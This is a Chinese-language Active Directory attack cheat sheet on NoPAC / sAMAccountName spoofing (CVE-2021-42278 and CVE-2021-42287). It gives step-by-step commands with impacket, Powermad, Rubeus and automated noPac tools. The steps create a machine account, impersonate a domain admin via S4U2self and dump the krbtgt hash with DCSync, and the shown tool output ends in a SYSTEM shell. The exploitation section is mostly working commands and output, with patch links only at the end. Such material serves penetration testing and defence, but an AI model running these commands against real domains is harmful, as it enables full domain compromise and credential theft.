# NoPAC / sAMAccountName 欺骗 (sAMAccountName Spoofing)

在 S4U2Self 期间，如果找不到 TGT 中指定的计算机名称，KDC 会尝试在计算机名称后附加一个 '\$'。

攻击者可以创建一个新的机器帐户，并将其 sAMAccountName 设置为域控制器的 sAMAccountName——不带 '\$'。

例如，假设有一个域控制器的 sAMAccountName 设置为 'DC\$'。
然后，攻击者将创建一个机器帐户，其 sAMAccountName 设置为 'DC'。

之后攻击者便可为新创建的机器帐户请求 TGT。

在 KDC 颁发 TGT 之后，攻击者可以将新创建的机器帐户重命名为其他名称，例如 JOHNS-PC。

接下来，攻击者可以执行 S4U2Self，并作为任何用户请求一个指向其自身的 ST (服务票据)。

由于 sAMAccountName 设置为 'DC' 的机器帐户已被重命名，KDC 会尝试通过附加一个 '$' 来寻找机器帐户，这将会匹配到域控制器。随后 KDC 将为域控制器颁发有效的 ST。

**要求 (Requirements)**:

* MachineAccountQuota > 0

**检查是否可被利用 (Check for exploitation)**:

* 检查帐户的 MachineAccountQuota

  ```powershell
  netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
  StandIn.exe --object ms-DS-MachineAccountQuota=*
  ```

* 检查 DC 是否存在漏洞

  ```powershell
  netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
  ```

**利用 (Exploitation)**:

1. 创建一个计算机帐户

    ```powershell
    impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

    powermad@windows> . .\Powermad.ps1
    powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
    powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

    sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
    ```

2. 清除受控机器帐户的 `servicePrincipalName` 属性

    ```ps1
    krbrelayx@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

    powershell@windows> . .\Powerview.ps1
    powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
    ```

3. (CVE-2021-42278) 将受控机器帐户的 `sAMAccountName` 更改为不带尾部 `$` 的域控制器名称

    ```ps1
    # https://github.com/SecureAuthCorp/impacket/pull/1224
    impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
    ```

4. 为受控机器帐户请求 TGT

    ```ps1
    impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

    cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
    ```

5. 将受控机器帐户的 sAMAccountName 重置回旧值

    ```ps1
    impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
    ```

6. (CVE-2021-42287) 提交之前获取的 TGT，使用 `S4U2self` 请求服务票据

    ```ps1
    # https://github.com/SecureAuthCorp/impacket/pull/1202
    impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

    cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
    ```

7. DCSync

    ```ps1
    KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
    ```

自动化利用 (Automated exploitation):

* [cube0x0/noPac](https://github.com/cube0x0/noPac) - Windows

    ```powershell
    noPac.exe scan -domain htb.local -user user -pass 'password123'
    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
    noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
    ```

* [Ridter/noPac](https://github.com/Ridter/noPac) - Linux

  ```ps1
  python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
  ```

* [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)

    ```ps1
    $ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
    [*] Selected Target dc.caltech.white                                              
    [*] Total Domain Admins 11                                                        
    [*] will try to impersonat gaylene.dreddy                                         
    [*] Current ms-DS-MachineAccountQuota = 10                                        
    [*] Adding Computer Account "SAMTHEADMIN-11$"                                     
    [*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
    [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
    [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
    [*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
    [*] Saving ticket in dc.ccache                                                    
    [*] Resting the machine account to SAMTHEADMIN-11$                                
    [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
    [*] Using TGT from cache                                                          
    [*] Impersonating gaylene.dreddy                                                  
    [*]     Requesting S4U2self                                                       
    [*] Saving ticket in gaylene.dreddy.ccache                                        
    [!] Launching semi-interactive shell - Careful what you execute                   
    C:\Windows\system32>whoami                                                        
    nt authority\system 
    ```

* [ly4k/Pachine](https://github.com/ly4k/Pachine)

    ```powershell
    usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
                  [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
                  [domain/]username[:password]
    $ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'
    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'
    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache
    $ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'
    ```

**缓解措施 (Mitigations)**:

* [KB5007247 - Windows Server 2012 R2](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520)
* [KB5008601 - Windows Server 2016](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9)
* [KB5008602 - Windows Server 2019](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7)
* [KB5007205 - Windows Server 2022](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31)
* [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
* [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)

## 参考资料 (References)

* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
